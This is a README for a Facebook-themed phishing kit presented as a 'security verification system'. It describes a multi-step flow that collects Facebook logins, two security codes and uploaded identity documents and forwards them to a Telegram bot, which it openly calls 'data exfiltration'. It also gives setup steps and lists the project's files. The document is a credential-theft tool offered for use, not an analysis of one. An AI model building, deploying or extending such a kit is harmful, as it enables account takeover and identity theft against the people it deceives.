# Facebook Security Verification System

A specialized security verification flow designed to collect and verify user credentials, security codes, and identity documents.

## Features
- **Facebook-Themed UI**: Professional-grade responsive interface.
- **Multi-Step Verification**: Login -> Security Code 1 -> Security Code 2 -> ID Upload.
- **Real-Time Notifications**: All data is forwarded to a Telegram bot for immediate review.
- **Responsive Design**: Works on mobile and desktop.

## Technical Stack
- **Backend**: Node.js with Express.
- **Frontend**: Vanilla HTML5, CSS3, and JavaScript.
- **Integration**: Telegram Bot API for data exfiltration/notification.

## Setup
1. Ensure `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are set in environment variables.
2. Run `npm install`.
3. Start the server using the `SimpleServer` workflow.

## Project Structure
- `simple_server.js`: Main application server and Telegram proxy.
- `index.html`: Entry point with integrated verification logic.
- `sent.html`: Post-upload redirect page.
- `final_confirmation.html`: Final user destination.
